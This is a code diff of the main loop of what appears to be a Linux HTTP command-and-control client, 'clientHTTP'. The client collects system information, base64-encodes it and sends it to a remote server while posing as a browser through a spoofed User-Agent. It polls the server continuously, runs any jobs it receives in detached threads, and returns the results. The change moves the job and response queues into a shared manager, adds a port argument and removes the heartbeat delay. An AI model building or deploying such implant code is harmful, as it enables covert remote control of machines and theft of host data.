@@ -22,48 +22,38 @@
 #include <iostream>
 #include <string>
 #include "http.h"
-#include <sstream>
-#include <unistd.h>
 #include "utilities.h"
-#include <vector>
-#include <mutex>
-#include <queue>
 #include "operations.h"
 #include <thread>
+#include <sharedResourceManager.h>
 
 
-// These are all extern variables declared in "operations.h" file
-std::queue<std::wstring> responseQueue;
-std::mutex responseQueueMutex;
-std::queue<std::wstring> jobQueue;
-std::mutex jobQueueMutex;
-std::wstring jsonSysInfo;
-
-
-#define NUM_OF_ARGS 2
+#define NUM_OF_ARGS 3
 
 
 int main(int argc, char** argv) {
 
     if(argc != NUM_OF_ARGS){
-        std::cout << "clientHTTP <URL/IP>" <<std::endl;
+        std::cout << "clientHTTP <URL/IP> <PORT>" <<std::endl;
         return -1;
     }
-    // Set the HEART BEAT TIMER (in secs)
-    const long heartbeatTimerInSecs {1};
 
-    std::wstring request = L"POST / HTTP/1.1\r\nHost: github.com/tajiknomi/ClientHTTP_linux?HeartBeatSignal\r\nAccept-Encoding: identity\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64)\r\nContent-Type: application/octet-stream\r\n";
-    std::wstring hostname{ s2ws(argv[1]) };
-    //request += "Host: "+hostname+"\r\n";
-    
-    jsonSysInfo = getSysInfo();
+    const std::wstring url{ s2ws(argv[1]) };
+    const std::wstring port{ s2ws(argv[2]) };
+    if (!isValidPort(ws2s(port))) {
+		return -1;
+	}
 
-    if(jsonSysInfo.empty()){
+    std::wstring request = L"POST / HTTP/1.1\r\nHost: github.com/tajiknomi/ClientHTTP_linux?HeartBeatSignal\r\nAccept-Encoding: identity\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64)\r\nContent-Type: application/octet-stream\r\n";  
+    const std::wstring sysInfo {getSysInfo()};
+       if(sysInfo.empty()){
         std::cout << "Couldn't extract system information\n";
         //exit(-1);     // Inform CRC about the this status by sending log or json NULL bytes
     }
-    
-    std::string dataBase64 = base64_encode((unsigned char*)ws2s(jsonSysInfo).c_str(), jsonSysInfo.length());
+    SharedResourceManager sharedResources;
+    sharedResources.setSysInfoInJson(sysInfo);
+ 
+    std::string dataBase64 = base64_encode((unsigned char*)ws2s(sysInfo).c_str(), sysInfo.length());
     std::wstringstream contentLengthStream;
     contentLengthStream << dataBase64.length();
     request += L"Content-Length: " + contentLengthStream.str() + L"\r\n";
@@ -73,27 +63,20 @@ int main(int argc, char** argv) {
     std::wstring replyFromServerInJson;
     std::wstring response;    
     const std::wstring heartbeatRequestToServer = request;
-
+    
     while(true){
-        if(!responseQueue.empty()){         // If there is a response to be send to the server
-            responseQueueMutex.lock();
-            request = responseQueue.front();
-            responseQueue.pop();
-            responseQueueMutex.unlock();
+        if(sharedResources.isResponseAvailable()){      // If there is a response to be send to the server
+            request = sharedResources.popResponse();
         }
-        else {                             // else, send the standard http post message to the server
+        else {                                          // else, send the standard http post message to the server
             request = heartbeatRequestToServer;
         }        
-        replyFromServerInJson = httpPost(hostname, request);
-        
+        replyFromServerInJson = httpPost(url, port, request);        
         if(isJobAvailable(replyFromServerInJson)){  // Check the response from the server to see if it is a job request
-            jobQueueMutex.lock();
-            jobQueue.push(replyFromServerInJson);
-            jobQueueMutex.unlock();
-            std::thread jobThread(startJob);      // Spawn a thread if there is a job waiting in the queue
+            sharedResources.pushJob(replyFromServerInJson);
+            std::thread jobThread(startJob, std::ref(sharedResources));      // Spawn a thread if there is a job waiting in the queue
             jobThread.detach();
-        }               
-        request = heartbeatRequestToServer;        
-        sleep(heartbeatTimerInSecs);                // for for microsecond intervals, use usleep() --> https://man7.org/linux/man-pages/man3/usleep.3.html
+        }                      
+        request = heartbeatRequestToServer;      
     }
 }
